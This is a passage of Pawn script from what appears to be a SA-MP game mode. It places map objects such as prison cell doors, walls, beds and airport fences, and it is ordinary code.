    CreateObject(8661, 1785.86658, -1576.10242, 1996.35950,   0.00000, 180.00000, 0.00000);
    CreateObject(8661, 1785.86658, -1556.17297, 1996.35950,   0.00000, 180.00000, 0.00000);
    CreateObject(8661, 1750.70068, -1536.21228, 1996.35950,   0.00000, 180.00000, 0.00000);
    CreateObject(8661, 1787.77686, -1547.87012, 1992.67004,   0.00000, 0.00000, 0.00000);
    CreateObject(8661, 1787.77686, -1567.77063, 1992.67004,   0.00000, 0.00000, 0.00000);
    CreateObject(1800, 1748.54736, -1572.48010, 1992.65906,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1748.54736, -1568.23682, 1992.65906,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1751.70129, -1571.83716, 1993.88770,   0.00000, 0.00000, 90.00000);
    ZendanInfo[20][ciObjID] = CreateObject(19302, 1751.70129, -1570.09607, 1993.88770,   0.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1729.17273, -1568.84680, 1994.46655,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1568.82605, 1994.54749,   180.00000, 0.00000, 270.00000);
    CreateObject(1800, 1748.54736, -1563.93420, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17273, -1564.54626, 1994.49829,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1564.51587, 1994.53809,   180.00000, 0.00000, 270.00000);
    CreateObject(1800, 1748.54736, -1559.73206, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17273, -1560.31592, 1994.31824,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1560.28528, 1994.36865,   180.00000, 0.00000, 270.00000);
    CreateObject(1800, 1748.54736, -1555.48938, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17273, -1556.08545, 1994.33801,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1556.06409, 1994.49829,   180.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1777.74475, -1555.70300, 1994.55725,   0.00000, 360.00000, 0.00000);
    CreateObject(1800, 1748.54736, -1551.17639, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17273, -1551.80554, 1994.49841,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1551.78284, 1994.37805,   180.00000, 0.00000, 270.00000);
    CreateObject(1800, 1748.54736, -1546.89502, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17273, -1547.53394, 1994.40869,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1748.54736, -1542.66357, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1547.50330, 1994.50757,   180.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1729.17273, -1543.27271, 1994.42798,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1543.24182, 1994.43884,   180.00000, 0.00000, 270.00000);
    CreateObject(1800, 1778.70972, -1539.84143, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.10266, -1538.95190, 1994.37769,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.08398, -1538.95190, 1994.48743,   0.00000, 180.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1543.24182, 1994.47681,   0.00000, 360.00000, 270.00000);
    CreateObject(1800, 1778.70972, -1544.12256, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1543.25183, 1994.52820,   180.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1547.48352, 1994.33716,   0.00000, 360.00000, 270.00000);
    CreateObject(1800, 1778.70972, -1548.36108, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1547.50208, 1994.56763,   180.00000, 0.00000, 90.00000);
    CreateObject(1800, 1778.70972, -1552.65125, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1551.74414, 1994.40796,   0.00000, 360.00000, 270.00000);
    CreateObject(1800, 1778.70972, -1556.91016, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1551.75281, 1994.51868,   180.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1556.00537, 1994.20813,   0.00000, 360.00000, 270.00000);
    CreateObject(1800, 1778.70972, -1561.11975, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1556.01331, 1994.54858,   180.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1560.23682, 1994.26770,   0.00000, 360.00000, 270.00000);
    CreateObject(1800, 1778.70972, -1565.38013, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1560.24353, 1994.37805,   180.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1564.46790, 1994.31799,   0.00000, 360.00000, 270.00000);
    CreateObject(1800, 1778.70972, -1569.67065, 1992.65906,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1564.47400, 1994.39795,   180.00000, 0.00000, 90.00000);
    CreateObject(1800, 1778.70972, -1573.90063, 1992.63904,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1568.71924, 1994.51746,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1568.74463, 1994.37805,   180.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1573.00977, 1994.45776,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1573.01636, 1994.38794,   180.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1577.30994, 1997.86853,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1577.30994, 1994.36829,   0.00000, 360.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1570.99597, 1995.73070,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1751.70129, -1567.56628, 1993.88770,   0.00000, 0.00000, 90.00000);
    CreateObject(2602, 1746.30432, -1539.43347, 1993.17786,   0.00000, 0.00000, 0.00000);
    ZendanInfo[21][ciObjID] = CreateObject(19302, 1751.70129, -1565.83521, 1993.88770,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1566.68530, 1995.73070,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1751.70129, -1563.23535, 1993.88770,   0.00000, 0.00000, 90.00000);
    ZendanInfo[22][ciObjID] = CreateObject(19302, 1751.70129, -1561.56396, 1993.88770,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1562.32458, 1995.73070,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1751.70129, -1559.00439, 1993.88770,   0.00000, 0.00000, 90.00000);
    ZendanInfo[23][ciObjID] = CreateObject(19302, 1751.70129, -1557.32300, 1993.88770,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1558.23364, 1995.73070,   0.00000, 0.00000, 90.00000);
    ZendanInfo[24][ciObjID] = CreateObject(19302, 1751.70129, -1553.05078, 1993.88770,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1554.75317, 1993.88770,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1751.71753, -1553.89343, 1995.73070,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1751.70129, -1550.49255, 1993.88770,   0.00000, 0.00000, 90.00000);
    ZendanInfo[25][ciObjID] = CreateObject(19302, 1751.70129, -1548.77930, 1993.88770,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1549.66382, 1995.73070,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1751.70129, -1546.25208, 1993.88770,   0.00000, 0.00000, 90.00000);
    ZendanInfo[26][ciObjID] = CreateObject(19302, 1751.70129, -1544.53809, 1993.88770,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1545.43311, 1995.73070,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1751.70129, -1541.96118, 1993.88770,   0.00000, 0.00000, 90.00000);
    ZendanInfo[27][ciObjID] = CreateObject(19302, 1751.70129, -1540.22815, 1993.88770,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1541.07336, 1995.73070,   0.00000, 0.00000, 90.00000);
    ZendanInfo[36][ciObjID] = CreateObject(19302, 1771.63574, -1576.03638, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1574.29749, 1993.89758,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1771.64087, -1575.15613, 1995.72969,   0.00000, 0.00000, 90.00000);
    ZendanInfo[35][ciObjID] = CreateObject(19302, 1771.63562, -1571.75598, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1570.00732, 1993.89758,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1771.64087, -1570.86548, 1995.72969,   0.00000, 0.00000, 90.00000);
    CreateObject(1209, 1760.69385, -1566.40222, 2000.44995,   0.00000, 0.00000, 90.00000);
    ZendanInfo[34][ciObjID] = CreateObject(19302, 1771.63562, -1567.44543, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1565.72693, 1993.89758,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1771.64087, -1566.64478, 1995.72969,   0.00000, 0.00000, 90.00000);
    ZendanInfo[33][ciObjID] = CreateObject(19302, 1771.63562, -1563.21521, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1561.50671, 1993.89758,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1771.64087, -1562.29541, 1995.72969,   0.00000, 0.00000, 90.00000);
    ZendanInfo[32][ciObjID] = CreateObject(19302, 1771.63562, -1558.98413, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1557.27612, 1993.89758,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1771.64087, -1558.16479, 1995.72969,   0.00000, 0.00000, 90.00000);
    ZendanInfo[31][ciObjID] = CreateObject(19302, 1771.63562, -1554.71362, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1553.02563, 1993.89758,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1771.64087, -1553.91382, 1995.72969,   0.00000, 0.00000, 90.00000);
    ZendanInfo[30][ciObjID] = CreateObject(19302, 1771.63562, -1550.46265, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1548.74451, 1993.89758,   0.00000, 0.00000, 270.00000);
    ZendanInfo[29][ciObjID] = CreateObject(19302, 1771.63562, -1546.21228, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1544.51392, 1993.89758,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1771.64087, -1545.33423, 1995.72969,   0.00000, 0.00000, 90.00000);
    ZendanInfo[28][ciObjID] = CreateObject(19302, 1771.63562, -1541.96216, 1993.89758,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1540.25244, 1993.89758,   0.00000, 0.00000, 270.00000);
    CreateObject(19304, 1771.64087, -1541.10327, 1995.72969,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1768.92444, -1545.66089, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(1808, 1760.62598, -1567.61597, 2000.43945,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1768.92444, -1539.74133, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(19388, 1768.92444, -1542.70117, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(2205, 1762.94946, -1541.28699, 1992.46863,   0.00000, 0.00000, 270.00000);
    CreateObject(2602, 1746.30542, -1539.39746, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.54199, -1548.03125, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.54199, -1552.27124, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.54199, -1556.57117, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.54199, -1560.79126, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.54199, -1565.03125, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.54199, -1569.33130, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.54199, -1573.63135, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1776.25537, -1542.75208, 1996.89539,   0.00000, 0.00000, 180.00000);
    //CreateObject(7191, 1777.74475, -1555.70300, 1998.45715,   0.00000, 360.00000, 0.00000);
    CreateObject(2602, 1776.33008, -1547.01050, 1996.89539,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1776.28479, -1551.30457, 1996.89539,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1776.33008, -1555.55054, 1996.89539,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1776.33008, -1559.77063, 1996.89539,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1776.33008, -1563.99060, 1996.89539,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1776.33008, -1568.23059, 1996.89539,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1776.33008, -1572.55066, 1996.89539,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1776.33008, -1576.81079, 1996.89539,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1746.54199, -1573.63135, 1993.16492,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.53687, -1569.33118, 1993.16492,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.53687, -1564.99622, 1993.16492,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.53687, -1560.80322, 1993.16492,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.53687, -1556.56726, 1993.16492,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.53687, -1552.29224, 1993.16492,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.53687, -1548.02222, 1993.16492,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1746.53687, -1543.75818, 1993.16492,   0.00000, 0.00000, 0.00000);
    CreateObject(2602, 1775.94910, -1542.76038, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94910, -1547.00037, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94714, -1551.26440, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94714, -1555.53040, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94714, -1555.53040, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94714, -1559.76636, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94714, -1564.00842, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94714, -1568.25342, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94714, -1572.52039, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(2602, 1775.94714, -1576.84338, 1993.17786,   0.00000, 0.00000, 180.00000);
    CreateObject(3857, 1772.07666, -1574.79248, 2004.27051,   0.00000, 0.00000, -44.90002);
    CreateObject(7191, 1729.17273, -1564.54626, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1564.51587, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1568.84680, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1568.82605, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1744.86584, -1561.08081, 1994.59607,   0.00000, 0.00000, 180.00000);
    CreateObject(7191, 1729.17505, -1573.10706, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1573.14868, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1573.00977, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1573.01636, 1998.46887,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1577.38928, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1568.71924, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1568.74463, 1998.46887,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1564.46790, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1564.47400, 1998.46887,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1560.24353, 1998.46887,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1560.23682, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1556.00537, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1556.01331, 1998.46887,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1551.74414, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1551.75281, 1998.46887,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1547.48352, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1547.50208, 1998.46887,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1744.86584, -1561.08081, 1998.44885,   0.00000, 0.00000, 180.00000);
    CreateObject(7191, 1794.09277, -1543.24182, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1543.25183, 1998.46887,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.08398, -1538.95190, 1998.46887,   0.00000, 180.00000, 270.00000);
    CreateObject(7191, 1729.17505, -1577.38928, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17505, -1573.10706, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1573.14868, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1568.82605, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1568.84680, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1564.51587, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1564.54626, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17273, -1560.31592, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1560.28528, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17505, -1556.06409, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1556.08545, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17273, -1551.80554, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1551.78284, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17505, -1547.50330, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1547.53394, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17273, -1543.27271, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1543.24182, 1998.46887,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.10266, -1538.95190, 1998.44885,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1560.24353, 1994.54736,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1564.46790, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1556.01331, 1994.54736,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1560.23682, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1551.75281, 1994.54736,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1556.00537, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1551.74414, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1547.50208, 1994.54736,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1543.25183, 1994.54736,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1547.48352, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1729.10266, -1538.95190, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.08398, -1538.95190, 1994.54736,   0.00000, 180.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1543.24182, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1729.17590, -1547.52332, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1543.27271, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1543.24182, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1547.53394, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17273, -1551.80554, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1551.78284, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1729.17273, -1556.08545, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1556.06409, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1777.74475, -1555.70300, 1994.55725,   0.00000, 360.00000, 0.00000);
    CreateObject(7191, 1729.17273, -1560.31592, 1994.55774,   0.00000, 0.00000, 90.00000);
    CreateObject(7191, 1729.17505, -1560.28528, 1994.51770,   180.00000, 0.00000, 270.00000);
    CreateObject(7191, 1777.74475, -1555.70300, 1998.45715,   0.00000, 360.00000, 0.00000);
    CreateObject(7191, 1794.09277, -1568.71924, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1568.74463, 1994.54736,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1573.00977, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1573.01636, 1994.54736,   180.00000, 0.00000, 90.00000);
    CreateObject(7191, 1794.09277, -1577.30994, 1998.02844,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1577.30994, 1994.56836,   0.00000, 360.00000, 270.00000);
    CreateObject(7191, 1794.09277, -1564.47400, 1994.54736,   180.00000, 0.00000, 90.00000);
	//Boat Rent
    CreateDynamicObject(10832,1605.13281250,624.76898193,11.56999969,0.000,0.000,90.000,0,0,-1,1000.0,1000.0);
	//Farmer
    CreateDynamicObject(1497, -391.8033, -1438.3856, 25.28618,   0.00000, 0.00000, 268.99939,0,0,-1,1000.0,1000.0);
    //airport
	CreateDynamicObject(2773, 1640.25354, -2248.69531, 12.83109,   0.00000, 0.00000, 270.18170);
	CreateDynamicObject(2773, 1645.53833, -2248.77197, 12.83109,   0.00000, 0.00000, 270.18170);
	CreateDynamicObject(970, 1648.80505, -2248.89087, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1652.89209, -2248.88477, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1657.05347, -2248.90796, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1661.15735, -2248.92065, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1665.29822, -2248.93359, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1669.38684, -2248.93579, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1673.42346, -2248.95581, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1677.59888, -2248.95044, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1681.62512, -2248.95435, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1685.79517, -2248.95459, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1689.92090, -2248.92017, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1693.99390, -2248.92529, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1698.07361, -2248.93872, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1702.21545, -2248.94312, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1706.38367, -2248.95605, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1710.50647, -2248.95166, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1714.65710, -2248.94702, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1718.76611, -2248.92236, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1722.88513, -2248.92310, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1726.98950, -2248.92114, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1734.57104, -2250.44336, 12.78141,   0.00000, 0.00000, 312.95200);
	CreateDynamicObject(970, 1731.10413, -2248.90991, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1736.42981, -2254.02612, 12.78141,   0.00000, 0.00000, 460.19244);
	CreateDynamicObject(970, 1736.97607, -2258.15894, 12.78141,   0.00000, 0.00000, 94.82485);
	CreateDynamicObject(970, 1737.14319, -2262.32007, 12.78141,   0.00000, 0.00000, 89.78732);
	CreateDynamicObject(970, 1737.13477, -2266.45581, 12.78141,   0.00000, 0.00000, 89.78732);
	CreateDynamicObject(970, 1636.94519, -2248.77466, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1632.82764, -2248.81323, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1628.67883, -2248.82617, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1624.52002, -2248.83276, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1620.36475, -2248.84497, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1616.24658, -2248.85083, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1612.22510, -2248.87817, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1608.07678, -2248.85571, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1603.91760, -2248.82910, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1599.73743, -2248.82593, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1595.56372, -2248.82959, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1591.41638, -2248.83569, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1587.29285, -2248.81519, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1583.15735, -2248.84937, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1579.00781, -2248.87720, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1586.71301, -2258.65063, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1590.82300, -2258.65796, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1603.24280, -2258.56323, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1607.34412, -2258.59619, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1611.48279, -2258.59717, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1615.61816, -2258.59937, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1619.78772, -2258.65527, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1628.03589, -2258.65234, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1623.91760, -2258.65527, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1594.97046, -2258.60889, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1599.12317, -2258.62134, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1633.98743, -2261.41699, 12.78141,   0.00000, 0.00000, 266.18704);
	CreateDynamicObject(970, 1645.27454, -2258.73584, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1643.23560, -2261.42041, 12.78141,   0.00000, 0.00000, 270.36465);
	CreateDynamicObject(970, 1638.34973, -2263.65845, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1632.12854, -2258.62134, 12.78141,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1649.31494, -2258.71411, 12.78141,   0.00000, 0.00000, 0.00000);
